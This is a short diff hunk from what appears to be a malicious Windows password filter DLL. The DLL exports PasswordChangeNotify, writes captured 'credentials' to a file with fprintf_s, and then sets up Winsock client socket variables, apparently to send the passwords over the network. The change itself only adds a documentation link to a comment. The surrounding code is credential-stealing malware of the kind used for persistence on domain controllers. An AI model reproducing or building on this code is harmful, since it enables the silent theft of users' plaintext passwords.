@@ -55,7 +55,7 @@ extern "C" __declspec(dllexport) NTSTATUS PasswordChangeNotify(
 	fprintf_s(OUTFILE, "%s\n", credentials);
 	fclose(OUTFILE);
 
-    //Winsock data
+    //Winsock data (https://docs.microsoft.com/en-us/windows/win32/winsock/complete-client-code)
     WSADATA wsaData;
     SOCKET ConnectSocket = INVALID_SOCKET;
     struct addrinfo* result = NULL,
